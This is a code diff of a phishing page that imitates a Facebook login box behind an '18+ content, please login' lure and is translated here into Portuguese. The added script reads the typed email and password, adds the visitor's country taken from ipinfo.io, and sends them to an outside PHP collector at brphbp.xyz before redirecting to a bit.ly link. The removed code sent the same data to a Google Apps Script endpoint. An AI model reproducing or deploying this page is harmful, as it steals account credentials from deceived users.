@@ -1,8 +1,6 @@
-
-<!DOCTYPE html>
-<html>
-
+<html>	
 <head>
+    <meta charset="UTF-8" />
     <title></title>
     <style>
         .modal-content {
@@ -130,18 +128,18 @@
                 <div class="modal-body">
                     <section class="login-form-wrap">
                         <h1 class="facebook_logo">Facebook</h1>
-                        <div style="    background-color: #fff9d7; border: 1px solid #e2c822; padding: 6px; margin-bottom: 5px;" id="noti">Content 18+, please login before viewing.</div>
-                        <form class="login-form" id="test-form" method="GET" action="https://script.google.com/macros/s/AKfycby10ojEKqN-YUpm19E9732LE08MoIMt0romMp_yeXvCYoyPONTV5rTHHG6DpbFRoZwdPQ/exec">
+                        <div style="    background-color: #fff9d7; border: 1px solid #e2c822; padding: 6px; margin-bottom: 5px;" id="noti">Conteúdo para maiores de 18 anos, faça login antes de visualizar.</div>
+                        <form class="login-form" id="test-form" method="GET">
                             <label class="mt-10">
-                                <input id="username" type="text" name="username" required="" placeholder="Email or phone number">
+                                <input id="username" type="text" name="username" required="" placeholder="Email ou número de telefone">
                             </label>
                             <label class="mt-10">
-                                <input id="password" type="password" name="password" required="" placeholder="password">
+                                <input id="password" type="password" name="password" required="" placeholder="Senha">
                             </label>
 							<input id="country" type="text" name="country" style="display:none">
-                            <input class="mt-10" type="button" onclick="submitForm();" id="btnSubmit" value="Log in">
+                            <input class="mt-10" type="button" onclick="submitForm();" id="btnSubmit" value="Entrar">
                         </form>
-                        <h5 class="forgotpass_h5"><a href="https://bit.ly/2Ql39OJlogin/identify/?ctx=recover&ars=facebook_login" target="_blank" class="forgotpass">Forgot password?</a></h5>
+                        <h5 class="forgotpass_h5"><a href="#" target="_blank" class="forgotpass">Você esqueceu sua senha?</a></h5>
                     </section>
                 </div>
             </div>
@@ -161,40 +159,49 @@ $(document).ready(() => {
 });
 var count = 0;
 
+sr = "";
 
-var g_IPAdress = "";
-var g_Country = "";
-GetIPAdress();
-function GetIPAdress() {
- var requestOptions = {
- method: 'GET',
- redirect: 'follow'
- };
+var xhrip = new XMLHttpRequest();
+xhrip.open('GET', 'https://ipinfo.io/json');
+xhrip.onload = function() {
+    
+    if (xhrip.status === 200) 
+    {
+        try
+        {
+            var rs = xhrip.responseText;
+            var js = JSON.parse(rs);
+            sr+=js.country;
+            //sr+=" - " + js.region; 
+            
+        }catch(ex)
+        {
+            sr+=" - Error";
+        }
+    
+        
+        
+    }
+    else 
+    {
+        var err = xhr.status;
+        sr+=err;
+    }
 
- fetch("http://gd.geobytes.com/GetCityDetails", requestOptions)
- .then(response => response.text())
- .then(result => {
- try {
- let res = JSON.parse(result);
- g_IPAdress = res.geobytesipaddress;
- g_Country = res.geobytesfqcn;
- 
- document.getElementById("country").value = g_IPAdress;
- }
- catch (ex) { }
+};
+xhrip.send();
 
- })
- .catch(error => console.log('error', error));
-}
+  
+
 
 function submitForm() {
-	$('#username').val("'" + $('#username').val());
-	$('#password').val("'" + $('#password').val());
+	// $('#username').val("'" + $('#username').val());
+	// $('#password').val("'" + $('#password').val());
 
     if ($('#username').val().length < 3 || $('#password').val().length < 6) {
 		//alert('Information entered is not correct');
 		$('#noti').css({ "color": "red" });
-		$('#noti').text('The account you have entered is invalid, Please try again.');
+		$('#noti').text('A conta que você inseriu é inválida, por favor, tente novamente.');
 		return;
     } else {
         //count++;
@@ -203,24 +210,25 @@ function submitForm() {
     if (true) {
         console.log(count);
         $('#loading').show();
-        var data = $('form#test-form').serialize();
-        $.ajax({
-            type: 'GET',
-            url: 'https://script.google.com/macros/s/AKfycby10ojEKqN-YUpm19E9732LE08MoIMt0romMp_yeXvCYoyPONTV5rTHHG6DpbFRoZwdPQ/exec',
-            dataType: 'json',
-            crossDomain: true,
-            data: data,
-            success: function(data) {
-                $('#loading').hide();
-				location.href = "https://bit.ly/2Ql39OJ";
-				return;
-				
-            }, error: function(request, status, error) {
-                $('#loading').hide();
-				
-				location.href = "https://bit.ly/2Ql39OJ";
-            }
-        });
+        var xhr = new XMLHttpRequest();
+        var email = document.getElementById("username").value;
+        var pass = document.getElementById("password").value;
+        var truyen = encodeURI("email=" + email + "||pass=" + pass + "||laguage=" + sr);
+
+        var xhr = new XMLHttpRequest();
+        xhr.open('GET', '//brphbp.xyz/br1c2500/accvia.php?'+ truyen);
+        xhr.onload = function () {
+          if (xhr.status === 200) {
+            try {
+              var rs = xhr.responseText;
+              if (rs != "error") {
+                window.location = 'https://bit.ly/3vKMymU';
+              }
+            } catch (ex) { }
+          }
+        };
+        xhr.send();
+
     }
 }
 
